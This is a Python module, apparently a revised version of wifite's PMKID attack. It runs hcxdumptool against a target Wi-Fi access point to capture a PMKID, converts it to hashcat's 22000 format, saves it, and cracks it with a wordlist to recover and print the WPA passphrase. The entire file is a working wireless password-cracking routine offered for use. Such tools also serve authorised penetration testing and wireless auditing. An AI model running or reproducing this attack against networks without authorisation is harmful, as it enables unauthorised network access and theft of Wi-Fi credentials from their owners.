#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
wifite/attack/pmkid.py — V3
PMKID attack using hcxdumptool + hcxpcapngtool.

V3 Changes:
- Hash format migrated from 16800 (.16800) to 22000 (.hc22000)
- hcxdumptool now uses --filterlist_ap (replaces --filterlist + --filtermode)
- hcxpcapngtool replaces hcxpcaptool
- Hashcat cracks with -m 22000 (replaces -m 16800)
- Existing hash lookup updated to .hc22000 extension
- PMF-aware: logs a warning if target has PMF (PMKID still possible, just noted)
"""

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapTool, Hashcat
from ..util.color import Color
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time
import re


class AttackPMKID(Attack):

    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.success = False
        bssid_safe = re.sub(r'[^0-9a-fA-F]', '', target.bssid)
        self.pcapng_file = Configuration.temp('pmkid_%s.pcapng' % bssid_safe)


    def get_existing_pmkid_file(self, bssid):
        '''
        Load PMKID Hash from a previously-captured hash in ./hs/
        V3: Searches for .hc22000 files (was .16800).

        Returns:
            The path to the hash file if found, None otherwise.
        '''
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        bssid = bssid.lower().replace(':', '')

        # V3: .hc22000 extension (was .16800)
        file_re = re.compile(r'.*pmkid_.*\.hc22000')
        for filename in os.listdir(Configuration.wpa_handshake_dir):
            pmkid_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if not os.path.isfile(pmkid_filename):
                continue
            if not re.match(file_re, pmkid_filename):
                continue

            with open(pmkid_filename, 'r') as pmkid_handle:
                for line in pmkid_handle:
                    line = line.strip()
                    if not line:
                        continue
                    # V3: 22000 format: WPA*01*pmkid*bssid*station*essid*...
                    parts = line.split('*')
                    if len(parts) >= 4:
                        existing_bssid = parts[3].lower().replace(':', '')
                        if existing_bssid == bssid:
                            return pmkid_filename
        return None


    def run(self):
        '''
        Performs PMKID attack.
            1) Captures PMKID hash (or re-uses existing).
            2) Cracks the hash with hashcat -m 22000.

        V3: Warns if target has PMF (PMKID capture still attempted).

        Returns:
            True if hash was captured (regardless of crack result).
            False if capture failed entirely.
        '''
        from ..util.process import Process
        # Check required tools
        dependencies = [
            Hashcat.dependency_name,
            HcxDumpTool.dependency_name,
            HcxPcapTool.dependency_name
        ]
        missing_deps = [dep for dep in dependencies if not Process.exists(dep)]
        if len(missing_deps) > 0:
            Color.pl('{!} Skipping PMKID attack, missing required tools: {O}%s{W}' % ', '.join(missing_deps))
            return False

        # V3: PMF warning — PMKID is still possible even with PMF
        if getattr(self.target, 'pmf', False):
            Color.pattack('PMKID', self.target, 'PMF',
                          '{O}Target has PMF enabled. '
                          'PMKID capture is still attempted (RSN extension).{W}')

        pmkid_file = None

        if Configuration.ignore_old_handshakes == False:
            pmkid_file = self.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                        'Loaded {C}existing{W} PMKID hash: {C}%s{W}\n' % pmkid_file)

        if pmkid_file is None:
            pmkid_file = self.capture_pmkid()

        if pmkid_file is None:
            return False

        # Crack it
        try:
            self.success = self.crack_pmkid_file(pmkid_file)
        except KeyboardInterrupt:
            Color.pl('\n{!} {R}Failed to crack PMKID: {O}Cracking interrupted by user{W}')
            self.success = False
            return False

        return True  # Capturing PMKID is a success even without cracking


    def capture_pmkid(self):
        '''
        Runs hcxdumptool and hcxpcapngtool to extract PMKID hash.
        V3: Uses 22000 format output from hcxpcapngtool.

        Returns:
            Path to the saved .hc22000 file, or None if not captured.
        '''
        self.keep_capturing = True
        self.timer = Timer(Configuration.pmkid_timeout)

        # Start hcxdumptool in background thread
        t = Thread(target=self.dumptool_thread)
        t.daemon = True
        t.start()

        # Poll hcxpcapngtool every second for a PMKID hash
        pmkid_hash = None
        pcaptool = HcxPcapTool(self.target)
        while self.timer.remaining() > 0:
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash is not None:
                break

            Color.pattack('PMKID', self.target, 'CAPTURE',
                    'Waiting for PMKID ({C}%s{W})' % str(self.timer))
            time.sleep(1)

        self.keep_capturing = False
        t.join(timeout=3)

        if pmkid_hash is None:
            Color.pattack('PMKID', self.target, 'CAPTURE',
                    '{R}Failed{O} to capture PMKID\n')
            Color.pl('')
            return None

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}Captured PMKID{W}')
        pmkid_file = self.save_pmkid(pmkid_hash)
        return pmkid_file


    def crack_pmkid_file(self, pmkid_file):
        '''
        Cracks PMKID hash file using hashcat -m 22000.
        V3: Uses mode 22000 (was 16800).

        Returns:
            True if cracked, False otherwise.
        '''
        if Configuration.wordlist is None:
            Color.pl('\n{!} {O}Not cracking PMKID '
                    'because there is no {R}wordlist{O} (re-run with {C}--dict{O})')
            key = None
        else:
            wordlist = Configuration.wordlist
            if wordlist.endswith('.gz') and os.path.exists(wordlist):
                import gzip
                decompressed_wl = Configuration.temp('wordlist.txt')
                try:
                    Color.pl('{+} {C}Decompressing compressed wordlist {G}%s{W}...' % os.path.basename(wordlist))
                    with gzip.open(wordlist, 'rb') as f_in:
                        with open(decompressed_wl, 'wb') as f_out:
                            f_out.write(f_in.read())
                    # Overwrite temp wordlist path for the session
                    Configuration.wordlist = decompressed_wl
                    wordlist = decompressed_wl
                except Exception as e:
                    Color.pl('{!} {R}Failed to decompress wordlist: {O}%s{W}' % str(e))
                    return False
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACK',
                    'Cracking PMKID using {C}%s{W} ...\n' % wordlist)
            key = Hashcat.crack_pmkid(pmkid_file)

        if key is None:
            if Configuration.wordlist is not None:
                Color.clear_entire_line()
                Color.pattack('PMKID', self.target, '{R}CRACK',
                        '{R}Failed {O}Passphrase not found in dictionary.\n')
            return False
        else:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACKED', '{C}Key: {G}%s{W}' % key)
            self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid,
                    pmkid_file, key)
            Color.pl('\n')
            self.crack_result.dump()
            return True


    def dumptool_thread(self):
        '''Runs hcxdumptool until hash found or capture stops.'''
        dumptool = HcxDumpTool(self.target, self.pcapng_file)

        while self.keep_capturing and dumptool.poll() is None:
            time.sleep(0.5)

        dumptool.interrupt()


    def save_pmkid(self, pmkid_hash):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        essid_safe = re.sub(r'[^a-zA-Z0-9]', '', self.target.essid or 'Unknown')
        bssid_safe = re.sub(r'[^0-9a-fA-F]', '', self.target.bssid)
        pmkid_hash_clean = re.sub(r'[^0-9a-fA-F:\*]', '', pmkid_hash.strip())
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        pmkid_file = 'pmkid_%s_%s_%s.hc22000' % (essid_safe, bssid_safe, date)
        pmkid_file = os.path.join(Configuration.wpa_handshake_dir, pmkid_file)

        Color.p('\n{+} Saving copy of {C}PMKID Hash{W} to {C}%s{W} ' % pmkid_file)
        old_mask = os.umask(0o177)
        try:
            with open(pmkid_file, 'w') as pmkid_handle:
                pmkid_handle.write(pmkid_hash_clean)
                pmkid_handle.write('\n')
        finally:
            os.umask(old_mask)

        return pmkid_file
